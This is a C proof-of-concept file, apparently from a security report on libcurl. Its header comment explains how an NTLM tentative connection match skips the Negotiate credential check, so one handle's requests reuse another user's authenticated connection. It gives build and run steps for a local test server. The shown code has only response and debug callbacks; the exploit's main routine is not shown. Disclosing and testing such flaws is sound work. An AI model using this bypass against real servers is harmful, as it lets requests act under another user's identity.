/*
 * PoC: NTLM tentative connection match bypasses Negotiate auth state check
 *
 * Demonstrates that in a multi-handle shared connection pool, when:
 *   1. Handle A authenticates via Negotiate (SPNEGO/Kerberos)
 *   2. Handle B requests the same host with CURLAUTH_ANY + different creds
 *
 * The NTLM tentative match in url_match_auth_ntlm() (url.c:1092) sets
 * m->found on the connection with mismatched credentials, returns FALSE,
 * which exits url_match_conn() BEFORE url_match_auth_nego() runs.
 * url_match_result() then attaches the connection based solely on m->found.
 *
 * Result: Handle B's request goes out on Handle A's TCP connection.
 * On a server with persistent Negotiate auth (IIS/Kerberos default),
 * this means Handle B is authenticated as User A.
 *
 * Build:
 *   gcc -o poc poc.c -I../include -L../lib/.libs -lcurl -Wl,-rpath,../lib/.libs
 *
 * Run:
 *   python3 server.py 8999 &
 *   ./poc
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

#define URL "http://127.0.0.1:8999/api/secret"

/* Capture response body */
struct response {
    char *data;
    size_t size;
};

static size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userp)
{
    struct response *resp = (struct response *)userp;
    size_t total = size * nmemb;
    char *tmp = realloc(resp->data, resp->size + total + 1);
    if(!tmp) return 0;
    resp->data = tmp;
    memcpy(&resp->data[resp->size], ptr, total);
    resp->size += total;
    resp->data[resp->size] = 0;
    return total;
}

/* Debug callback to trace connection IDs and auth headers */
static int debug_cb(CURL *handle, curl_infotype type, char *data,
                    size_t size, void *userp)
{
    const char *tag = (const char *)userp;
    if(type == CURLINFO_TEXT) {
        /* Show connection reuse and auth-related debug lines */
        if(strstr(data, "Re-using") || strstr(data, "onnection") ||
           strstr(data, "uthoriz") || strstr(data, "uthenticat") ||
           strstr(data, "NTLM") || strstr(data, "egotiat") ||
           strstr(data, "Found bundle") || strstr(data, "multiplex"))
            printf("  [%s] %.*s", tag, (int)size, data);
    }
    else if(type == CURLINFO_HEADER_OUT) {
        /* Show outgoing Authorization headers */
        const char *auth = strstr(data, "Authorization:");
        if(auth) {
            const char *end = strstr(auth, "\r\n");
            int len = end ? (int)(end - auth) : 60;
            printf("  [%s] >>> %.*s\n", tag, len, auth);
        }
        /* Show which host we're connecting to */
        const char *host = strstr(data, "Host:");
        if(host) {
            const char *end = strstr(host, "\r\n");
            int len = end ? (int)(end - host) : 40;
            printf("  [%s] >>> %.*s\n", tag, len, host);
        }
    }
    return 0;
}

